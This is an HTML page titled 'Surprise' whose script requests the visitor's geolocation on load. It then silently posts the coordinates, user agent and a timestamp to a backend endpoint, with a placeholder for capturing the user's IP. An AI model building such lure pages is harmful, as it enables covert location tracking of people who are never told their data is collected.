<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Surprise</title>
</head>
<body>
  <h1>SURPRISE</h1>
  <p id="status">Waiting for geolocation permission...</p>
  <p id="location"></p>

  <script>
    const statusElement = document.getElementById('status');
    const locationElement = document.getElementById('location');

    // Function to send data to the backend
    async function sendData(data) {
      try {
        const response = await fetch('/api/user-data', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data),
        });

        const result = await response.json();
        console.log('Server Response:', result);
        statusElement.textContent = 'Data sent successfully!';
      } catch (error) {
        console.error('Error sending data:', error);
        statusElement.textContent = 'Failed to send data.';
      }
    }

    // Function to get geolocation
    function getLocation() {
      if (!navigator.geolocation) {
        statusElement.textContent = 'Geolocation is not supported by your browser.';
        return;
      }

      statusElement.textContent = 'Requesting geolocation...';

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude } = position.coords;
          statusElement.textContent = 'Geolocation permission granted!';
          locationElement.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;

          // Collect additional user data
          const data = {
            ip: '8.8.8.8', // Replace this with a method to get the user's IP
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString(),
            latitude,
            longitude,
          };

          // Send data to the backend
          sendData(data);
        },
        (error) => {
          console.error('Error getting geolocation:', error);
          statusElement.textContent = 'Failed to get geolocation.';
        }
      );
    }

    // Trigger geolocation on page load
    getLocation();
  </script>
</body>
</html>
